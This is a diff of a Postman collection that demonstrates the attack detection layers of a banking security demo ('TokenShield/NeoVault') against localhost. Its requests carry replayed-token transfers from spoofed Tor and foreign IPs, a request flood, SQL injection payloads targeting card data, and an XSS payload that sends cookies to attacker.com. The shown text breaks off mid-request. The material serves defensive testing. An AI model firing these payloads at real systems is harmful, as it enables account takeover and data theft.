@@ -1,255 +1,904 @@
 {
   "info": {
-    "name": "TokenShield API",
-    "description": "Complete API test collection for TokenShield / NeoVault banking security platform.\n\n## Setup\n1. Set `baseUrl` variable to `http://localhost:5000`\n2. Run **Register** then **Login** — token is auto-saved\n3. All authenticated routes use `{{token}}` automatically",
-    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
-    "_postman_id": "tokenshield-v1"
+    "_postman_id": "tokenshield-complete-demo-v4",
+    "name": "TokenShield Complete Demo Suite — All 7 Defense Layers",
+    "description": "Full demonstration of all 7 TokenShield defense layers. Run requests in ORDER. All attacks go through NeoVault (port 5001) so the full middleware pipeline fires. War Room at http://localhost:7777/war-room updates live.\n\nPRE-REQUISITE: Run '1. Setup — Create Demo User' first, then '2. Login — Get JWT Token'. The token is auto-saved to {{token}} environment variable.\n\nWar Room: http://localhost:7777/war-room\nAttacker Studio: http://localhost:7777/attacker-studio\nNeoVault: http://localhost:5001",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
-    { "key": "baseUrl", "value": "http://localhost:5000", "type": "string" },
-    { "key": "token", "value": "", "type": "string" },
-    { "key": "username", "value": "testuser", "type": "string" },
-    { "key": "password", "value": "testpass123", "type": "string" }
+    {"key": "neovault_url", "value": "http://localhost:5001", "type": "string"},
+    {"key": "engine_url", "value": "http://localhost:7777", "type": "string"},
+    {"key": "token", "value": "", "type": "string"},
+    {"key": "session_id", "value": "", "type": "string"}
   ],
   "item": [
     {
-      "name": "Auth",
+      "name": "0. SETUP — Health Checks (Run These First)",
       "item": [
         {
-          "name": "Register",
+          "name": "0a. Engine Health Check",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/health",
+              "host": ["{{engine_url}}"],
+              "path": ["health"]
+            },
+            "description": "Verifies TokenShield AI Engine is running on port 7777. Should return {status: 'online'} with model health status."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Engine is online', function() {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('online');",
+                  "    console.log('✅ Engine online. Models:', JSON.stringify(json.models));",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "0b. NeoVault Health Check",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{neovault_url}}/health",
+              "host": ["{{neovault_url}}"],
+              "path": ["health"]
+            },
+            "description": "Verifies NeoVault Bank App is running on port 5001."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('NeoVault is online', function() {",
+                  "    pm.response.to.have.status(200);",
+                  "    console.log('✅ NeoVault online');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "0c. Engine Defense Layers Status",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/layers",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "layers"]
+            },
+            "description": "Shows all 7 defense layers and their live status. All 7 should be ACTIVE before demo."
+          }
+        },
+        {
+          "name": "0d. Engine Stats (Baseline)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/stats",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "stats"]
+            },
+            "description": "Baseline stats before any attacks. Note total_inspections count."
+          }
+        }
+      ]
+    },
+    {
+      "name": "1. SETUP — Create Demo User",
+      "request": {
+        "method": "POST",
+        "header": [
+          {"key": "Content-Type", "value": "application/json"}
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"username\": \"alice_demo\",\n  \"email\": \"alice@neovault.com\",\n  \"password\": \"SecurePass123!\"\n}"
+        },
+        "url": {
+          "raw": "{{neovault_url}}/api/auth/register",
+          "host": ["{{neovault_url}}"],
+          "path": ["api", "auth", "register"]
+        },
+        "description": "Creates a demo user (alice@neovault.com) in NeoVault. Run ONCE before all attacks. If user exists, move to Login."
+      },
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "pm.test('User created or already exists', function() {",
+              "    pm.expect([200, 201, 409]).to.include(pm.response.code);",
+              "    console.log('✅ User setup complete. Proceed to Login.');",
+              "});"
+            ],
+            "type": "text/javascript"
+          }
+        }
+      ]
+    },
+    {
+      "name": "2. SETUP — Login (Saves Token Automatically)",
+      "request": {
+        "method": "POST",
+        "header": [
+          {"key": "Content-Type", "value": "application/json"},
+          {
+            "key": "X-Forwarded-For",
+            "value": "106.51.75.45",
+            "description": "Legitimate login from Mumbai, India"
+          },
+          {"key": "User-Agent", "value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
+          {"key": "X-Device-Fingerprint", "value": "macbook-chrome-mumbai-fp-abc123def456"}
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"email\": \"alice@neovault.com\",\n  \"password\": \"SecurePass123!\"\n}"
+        },
+        "url": {
+          "raw": "{{neovault_url}}/api/auth/login",
+          "host": ["{{neovault_url}}"],
+          "path": ["api", "auth", "login"]
+        },
+        "description": "Authenticates alice@neovault.com from Mumbai IP. JWT token + session_id auto-saved to environment variables."
+      },
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "pm.test('Login successful — token saved', function() {",
+              "    pm.response.to.have.status(200);",
+              "    const json = pm.response.json();",
+              "    const token = json.token || json.access_token || json.jwt;",
+              "    const sessionId = json.session_id || json.sessionId;",
+              "    if (token) {",
+              "        pm.collectionVariables.set('token', token);",
+              "        try { pm.environment.set('token', token); } catch(e) {}",
+              "        try { pm.globals.set('token', token); } catch(e) {}",
+              "        console.log('✅ JWT saved:', token.substring(0,30) + '...');",
+              "    }",
+              "    if (sessionId) {",
+              "        pm.collectionVariables.set('session_id', sessionId);",
+              "        try { pm.environment.set('session_id', sessionId); } catch(e) {}",
+              "        try { pm.globals.set('session_id', sessionId); } catch(e) {}",
+              "        console.log('✅ Session ID saved:', sessionId);",
+              "    }",
+              "    console.log('📋 Full response:', JSON.stringify(json));",
+              "});"
+            ],
+            "type": "text/javascript"
+          }
+        }
+      ]
+    },
+    {
+      "name": "LAYER 1 — IP Reputation (Tor Exit Node)",
+      "item": [
+        {
+          "name": "L1-A. Legitimate Transfer (Baseline — Mumbai IP)",
           "request": {
             "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "106.51.75.45", "description": "Legitimate Mumbai IP"},
+              {"key": "User-Agent", "value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
+              {"key": "X-Device-Fingerprint", "value": "macbook-chrome-mumbai-fp-abc123def456"}
+            ],
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"username\": \"{{username}}\",\n  \"email\": \"{{username}}@example.com\",\n  \"password\": \"{{password}}\"\n}"
-            }
+              "raw": "{\n  \"amount\": 500,\n  \"to_account\": \"SAVINGS-ACC-9921\",\n  \"description\": \"Monthly rent payment\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/transfer",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "transfer"]
+            },
+            "description": "LEGITIMATE request from known Mumbai IP. Should PASS through all 7 layers. Watch War Room — no alert."
           },
-          "event": [{
-            "listen": "test",
-            "script": { "exec": [
-              "pm.test('Status 201', () => pm.response.to.have.status(201));",
-              "pm.test('success=true', () => pm.expect(pm.response.json().success).to.be.true);"
-            ]}
-          }]
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "exec": [
+                  "const curToken = pm.variables.get('token');",
+                  "if (!curToken || curToken === '') {",
+                  "    console.log('Token missing in Postman — auto-logging in as Alice...');",
+                  "    pm.sendRequest({",
+                  "        url: (pm.variables.get('neovault_url') || 'http://localhost:5001') + '/api/auth/login',",
+                  "        method: 'POST',",
+                  "        header: {",
+                  "            'Content-Type': 'application/json',",
+                  "            'X-Forwarded-For': '106.51.75.45',",
+                  "            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',",
+                  "            'X-Device-Fingerprint': 'macbook-chrome-mumbai-fp-abc123def456'",
+                  "        },",
+                  "        body: {",
+                  "            mode: 'raw',",
+                  "            raw: JSON.stringify({username: 'alice@neovault.com', password: 'SecurePass123!'})",
+                  "        }",
+                  "    }, function (err, res) {",
+                  "        if (!err && res.code === 200) {",
+                  "            const d = res.json();",
+                  "            if (d.token) {",
+                  "                pm.collectionVariables.set('token', d.token);",
+                  "                try { pm.environment.set('token', d.token); } catch(e) {}",
+                  "                try { pm.globals.set('token', d.token); } catch(e) {}",
+                  "                console.log('✅ Auto-login complete. Token saved.');",
+                  "            }",
+                  "        }",
+                  "    });",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
         },
         {
-          "name": "Login",
+          "name": "L1-B. 🚨 ATTACK — Session Hijack from Tor Exit Node (Frankfurt)",
           "request": {
             "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": "{{baseUrl}}/api/auth/login",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}",
+                "description": "Alice's STOLEN JWT token — same token, but now from a Tor node"
+              },
+              {"key": "Content-Type", "value": "application/json"},
+              {
+                "key": "X-Forwarded-For",
+                "value": "185.220.101.5",
+                "description": "🔴 ATTACKER IP: Known Tor Exit Node (Frankfurt, Germany) — S1 score will be 0.85"
+              },
+              {
+                "key": "X-Real-IP",
+                "value": "185.220.101.5"
+              },
+              {
+                "key": "User-Agent",
+                "value": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (Kali Linux)",
+                "description": "🔴 ATTACKER User-Agent: Different from victim's Chrome — S3 session drift"
+              },
+              {
+                "key": "X-Device-Fingerprint",
+                "value": "unknown-linux-tor-fp-000000000000",
+                "description": "🔴 Unknown device fingerprint — S3 device mismatch"
+              }
+            ],
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"username\": \"{{username}}\",\n  \"password\": \"{{password}}\"\n}"
+              "raw": "{\n  \"amount\": 75000,\n  \"to_account\": \"ATTACKER-OFFSHORE-ACCT-001\",\n  \"description\": \"Urgent wire — Account Verification\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/transfer",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "transfer"]
+            },
+            "description": "🔴 LAYER 1 ATTACK: Alice's stolen JWT used from a Tor Exit Node IP (185.220.101.5 = known Tor node). Engine signals fired:\n- S1: IP Reputation = 0.85 (Tor node)\n- S3: Session Consistency = high (IP changed, device changed)\n- S6: Geographic Impossibility = potential (Mumbai→Frankfurt instant)\n\nExpected: Engine blocks. War Room shows CRITICAL alert. Mitigation pipeline fires (8 steps)."
+          }
+        },
+        {
+          "name": "L1-C. Check Engine Incident Log After Attack",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/incidents?limit=1",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "incidents"],
+              "query": [{"key": "limit", "value": "1"}]
+            },
+            "description": "Retrieves the latest incident recorded. Should show the Tor node attack details with all signals."
+          }
+        },
+        {
+          "name": "L1-D. Get Full Forensic Report",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/incidents/latest/report",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "incidents", "latest", "report"]
+            },
+            "description": "Full forensic audit report for the latest incident. Includes threat actor profile, geo data, signal telemetry, mitigation timeline."
+          }
+        }
+      ]
+    },
+    {
+      "name": "LAYER 2 — Device Fingerprint Ban",
+      "item": [
+        {
+          "name": "L2-A. 🚨 ATTACK — Known Malicious Device (Fingerprint Banned)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "198.51.100.22", "description": "Attacker rotated to new IP to avoid L1"},
+              {"key": "User-Agent", "value": "python-requests/2.28.0", "description": "Automated tool User-Agent"},
+              {
+                "key": "X-Device-Fingerprint",
+                "value": "BANNED-DEVICE-FP-KNOWN-ATTACKER-RIG-001",
+                "description": "🔴 Device fingerprint that was previously banned during a prior compromise"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"amount\": 50000,\n  \"to_account\": \"MULE-ACCOUNT-XY-992\",\n  \"description\": \"Payroll processing\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/transfer",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "transfer"]
+            },
+            "description": "🔴 LAYER 2 ATTACK: Attacker switched to a fresh IP (avoids L1) but uses same banned device fingerprint.\n- S3: Device fingerprint in banned list → blocked at Layer 2\n\nDemonstrates that even after IP rotation, fingerprint persistence catches attackers."
+          }
+        },
+        {
+          "name": "L2-B. Admin — Register Device Fingerprint Ban",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": \"alice@neovault.com\",\n  \"metrics\": {\n    \"device_fingerprint_banned\": \"BANNED-DEVICE-FP-KNOWN-ATTACKER-RIG-001\"\n  }\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/biometric-update",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "biometric-update"]
+            },
+            "description": "Programmatically updates user profile to mark the attacker device fingerprint. Run this BEFORE L2-A for best demo."
+          }
+        }
+      ]
+    },
+    {
+      "name": "LAYER 3 — Geographic Impossibility (Haversine Travel)",
+      "item": [
+        {
+          "name": "L3-STEP1. Legitimate Login — Mumbai IP (Run 1st)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "106.51.75.45", "description": "Mumbai, India"},
+              {"key": "User-Agent", "value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"alice@neovault.com\",\n  \"password\": \"SecurePass123!\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/auth/login",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "Establishes geographic anchor — Mumbai, India (lat: 19.07, lng: 72.87). Engine records this IP for subsequent geo-impossibility check."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "const json = pm.response.json();",
+                  "const token = json.token || json.access_token || json.jwt;",
+                  "if (token) pm.collectionVariables.set('token', token);",
+                  "console.log('📍 Step 1: Location anchored at Mumbai, India (106.51.75.45)');"
+                ],
+                "type": "text/javascript"
+              }
             }
-          },
-          "event": [{
-            "listen": "test",
-            "script": { "exec": [
-              "pm.test('Status 200', () => pm.response.to.have.status(200));",
-              "const json = pm.response.json();",
-              "if (json.token) { pm.collectionVariables.set('token', json.token); pm.test('Token saved', () => true); }",
-              "pm.test('Login success', () => pm.expect(json.success).to.be.true);"
-            ]}
-          }]
+          ]
         },
         {
-          "name": "Login (wrong password)",
-          "request": {
-            "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": "{{baseUrl}}/api/auth/login",
-            "body": { "mode": "raw", "raw": "{\n  \"username\": \"{{username}}\",\n  \"password\": \"wrongpassword\"\n}" }
-          },
-          "event": [{ "listen": "test", "script": { "exec": [
-            "pm.test('Status 401', () => pm.response.to.have.status(401));",
-            "pm.test('success=false', () => pm.expect(pm.response.json().success).to.be.false);"
-          ]}}]
-        },
-        {
-          "name": "Login 2FA",
-          "request": {
-            "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": "{{baseUrl}}/api/auth/login-2fa",
-            "body": { "mode": "raw", "raw": "{\n  \"username\": \"{{username}}\",\n  \"password\": \"{{password}}\",\n  \"two_factor_code\": \"123456\"\n}" }
-          },
-          "event": [{ "listen": "test", "script": { "exec": [
-            "pm.test('Status 200 or 401', () => pm.expect([200, 401]).to.include(pm.response.code));"
-          ]}}]
-        },
-        {
-          "name": "Verify Session",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/auth/verify"
-          },
-          "event": [{ "listen": "test", "script": { "exec": [
-            "pm.test('Status 200', () => pm.response.to.have.status(200));",
-            "pm.test('Has session', () => pm.expect(pm.response.json()).to.have.property('session'));"
-          ]}}]
-        },
-        {
-          "name": "Get Sessions",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/auth/sessions"
-          }
-        },
-        {
-          "name": "Revoke Suspicious Sessions",
-          "request": {
-            "method": "POST",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/auth/sessions/revoke-suspicious"
-          },
-          "event": [{ "listen": "test", "script": { "exec": [
-            "pm.test('Status 200', () => pm.response.to.have.status(200));",
-            "pm.test('Has revoked_count', () => pm.expect(pm.response.json()).to.have.property('revoked_count'));"
-          ]}}]
-        },
-        {
-          "name": "TOTP Setup",
-          "request": {
-            "method": "POST",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/auth/totp/setup"
-          },
-          "event": [{ "listen": "test", "script": { "exec": [
-            "const json = pm.response.json();",
-            "if (json.secret) pm.collectionVariables.set('totp_secret', json.secret);",
-            "pm.test('Has QR code', () => pm.expect(json).to.have.property('qr_code'));"
-          ]}}]
-        },
-        {
-          "name": "TOTP Confirm",
+          "name": "L3-STEP2. 🚨 ATTACK — Impossible Travel Frankfurt→Mumbai in 1 Second",
           "request": {
             "method": "POST",
             "header": [
-              { "key": "Authorization", "value": "Bearer {{token}}" },
-              { "key": "Content-Type", "value": "application/json" }
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              },
+              {"key": "Content-Type", "value": "application/json"},
+              {
+                "key": "X-Forwarded-For",
+                "value": "185.107.80.12",
+                "description": "🔴 Frankfurt, Germany IP — 6,800 km from Mumbai in under 2 seconds = physically impossible"
+              },
+              {"key": "User-Agent", "value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"}
             ],
-            "url": "{{baseUrl}}/api/auth/totp/confirm",
-            "body": { "mode": "raw", "raw": "{\n  \"code\": \"000000\"\n}" }
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"amount\": 99999,\n  \"to_account\": \"EURO-MULE-ACCT-DE-447\",\n  \"description\": \"International wire transfer\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/transfer",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "transfer"]
+            },
+            "description": "🔴 LAYER 3 ATTACK: 2 seconds after Mumbai login, same token used from Frankfurt, Germany.\n- Distance: 6,800 km\n- Required speed: ~12,240,000 km/h (physically impossible)\n- S6: Geographic Impossibility score = 1.0\n\nEngine computes Haversine distance and required travel speed. Flags as account takeover."
           }
         },
         {
-          "name": "Logout",
-          "request": {
-            "method": "POST",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/auth/logout"
-          },
-          "event": [{ "listen": "test", "script": { "exec": [
-            "pm.test('Logout success', () => pm.expect(pm.response.json().success).to.be.true);",
-            "pm.collectionVariables.set('token', '');"
-          ]}}]
-        }
-      ]
-    },
-    {
-      "name": "Banking",
-      "item": [
-        {
-          "name": "Get Accounts",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/banking/accounts"
-          }
-        },
-        {
-          "name": "Get Transactions",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/banking/transactions"
-          }
-        },
-        {
-          "name": "Transfer Funds",
+          "name": "L3-STEP3. Direct Engine Geo-Impossibility Test (Engine Direct)",
           "request": {
             "method": "POST",
             "header": [
-              { "key": "Authorization", "value": "Bearer {{token}}" },
-              { "key": "Content-Type", "value": "application/json" }
+              {"key": "Content-Type", "value": "application/json"}
             ],
-            "url": "{{baseUrl}}/api/banking/transfer",
-            "body": { "mode": "raw", "raw": "{\n  \"to_account_number\": \"ACC-00000002\",\n  \"amount\": 100.00,\n  \"description\": \"Test transfer\"\n}" }
-          }
-        },
-        {
-          "name": "Pay Bill",
-          "request": {
-            "method": "POST",
-            "header": [
-              { "key": "Authorization", "value": "Bearer {{token}}" },
-              { "key": "Content-Type", "value": "application/json" }
-            ],
-            "url": "{{baseUrl}}/api/banking/pay-bill",
-            "body": { "mode": "raw", "raw": "{\n  \"payee_name\": \"Electric Company\",\n  \"payee_account\": \"ELEC-12345\",\n  \"amount\": 75.00,\n  \"description\": \"Monthly electricity\"\n}" }
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"geo_demo_session_alice_001\",\n  \"user_id\": \"alice@neovault.com\",\n  \"ip\": \"185.107.80.12\",\n  \"path\": \"/api/banking/transfer\",\n  \"method\": \"POST\",\n  \"payload\": {\n    \"amount\": 99999,\n    \"to_account\": \"EURO-MULE-ACCT-DE-447\"\n  }\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/analyze",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "analyze"]
+            },
+            "description": "Direct engine test — shows raw signal scores. S6 (geographic_impossibility) will be high for Frankfurt IP after Mumbai session."
           }
         }
       ]
     },
     {
-      "name": "Security",
+      "name": "LAYER 4 — Request Velocity / DDoS (Use Collection Runner)",
       "item": [
         {
-          "name": "Get Security Dashboard",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/security/dashboard"
-          }
-        },
-        {
-          "name": "Get Active Sessions",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/security/sessions"
-          }
-        },
-        {
-          "name": "Get Incident Logs",
-          "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/security/incidents"
-          }
-        },
-        {
-          "name": "Analyze Behavior",
+          "name": "L4-FLOOD. 🚨 ATTACK — High-Rate API Flood (USE COLLECTION RUNNER)",
           "request": {
             "method": "POST",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/security/analyze"
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {
+                "key": "X-Forwarded-For",
+                "value": "198.51.100.88",
+                "description": "🔴 Attacker botnet IP — same IP hammering repeated requests"
+              },
+              {"key": "User-Agent", "value": "python-requests/2.28.0"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"amount\": 1,\n  \"to_account\": \"PROBE-ACCOUNT-SCAN-{{$randomInt}}\",\n  \"description\": \"Account probe {{$randomInt}}\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/transfer",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "transfer"]
+            },
+            "description": "🔴 LAYER 4 ATTACK: Run this in Postman Collection Runner with:\n  - Iterations: 80\n  - Delay: 50ms (to simulate rapid fire)\n\nEngine's real-time sliding-window velocity tracker (60-second window) fires:\n- S2: Request Velocity score increases each iteration\n- At ~15 req/min threshold: score = 0.3 (low alert)\n- At ~30 req/min: score = 0.6 (medium — challenge mode)\n- At ~60 req/min: score = 0.9+ (critical — block + IP ban)\n\nWATCH: War Room velocity graph spikes. IP gets added to blocklist."
+          }
+        },
+        {
+          "name": "L4-CHECK. Velocity Tracker — Check IP Score After Flood",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"velocity_check_probe\",\n  \"ip\": \"198.51.100.88\",\n  \"path\": \"/check\",\n  \"method\": \"GET\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/analyze",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "analyze"]
+            },
+            "description": "Run this after the flood. request_velocity signal will show the accumulated score for 198.51.100.88."
           }
         }
       ]
     },
     {
-      "name": "Dashboard",
+      "name": "LAYER 5 — SQL Injection & Payload Analysis",
       "item": [
         {
-          "name": "User Dashboard Data",
+          "name": "L5-A. 🚨 ATTACK — SQL Injection UNION SELECT",
           "request": {
-            "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/dashboard/user"
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "203.0.113.45"},
+              {"key": "User-Agent", "value": "sqlmap/1.7.12#stable (https://sqlmap.org)"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"1001' UNION SELECT credit_card_num, cvv, pin FROM payment_cards WHERE '1'='1'--\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/search",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "search"]
+            },
+            "description": "🔴 LAYER 5 ATTACK: Classic UNION-based SQL injection attempt to extract credit card numbers.\n- S4: Payload Analysis score = 0.95 (UNION SELECT detected)\n- User-Agent: sqlmap (automated tool detection)\n- S3: Session consistency fails (bot User-Agent vs human baseline)\n\nEngine scans the raw payload for injection patterns and blocks immediately."
           }
         },
         {
-          "name": "Admin Dashboard Data",
+          "name": "L5-B. 🚨 ATTACK — Blind SQL Injection (Time-Based)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "203.0.113.67"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"1001'; WAITFOR DELAY '0:0:5'--\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/search",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "search"]
+            },
+            "description": "🔴 LAYER 5 ATTACK: Time-based blind SQL injection — attempts to delay DB response to confirm vulnerability.\n- S4: Payload Analysis score = 0.90 (WAITFOR/SLEEP detected)\nBlocked at payload inspection layer before DB query executes."
+          }
+        },
+        {
+          "name": "L5-C. 🚨 ATTACK — XSS Script Injection",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "203.0.113.88"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"query\": \"<script>document.cookie='stolen='+document.cookie;fetch('https://attacker.com/steal?c='+document.cookie);</script>\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/search",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "search"]
+            },
+            "description": "🔴 LAYER 5 ATTACK: Stored XSS attempt to exfiltrate session cookies.\n- S4: Payload Analysis detects <script> tag + document.cookie access\nBlocked before payload reaches the database."
+          }
+        }
+      ]
+    },
+    {
+      "name": "LAYER 6 — Session Drift & Behavioral Biometrics",
+      "item": [
+        {
+          "name": "L6-A. Establish Human Biometric Baseline (Run First)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": \"alice@neovault.com\",\n  \"metrics\": {\n    \"typing_wpm\": 68.0,\n    \"typing_rhythm_cv\": 0.18,\n    \"mouse_velocity_mean\": 450.2,\n    \"mouse_velocity_cv\": 0.32,\n    \"idle_time_ratio\": 0.24,\n    \"keypress_dwell_ms\": 87.5,\n    \"scroll_velocity\": 320.0\n  }\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/biometric-update",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "biometric-update"]
+            },
+            "description": "Establishes alice's LEGITIMATE human baseline — 68 WPM typing, normal mouse, natural idle time. Run this first so L6-B deviation is statistically significant."
+          }
+        },
+        {
+          "name": "L6-B. 🚨 ATTACK — Inhuman Bot Biometrics (285 WPM, Zero Mouse Motion)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{token}}"},
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-Forwarded-For", "value": "198.51.100.99"},
+              {
+                "key": "X-TS-Biometrics",
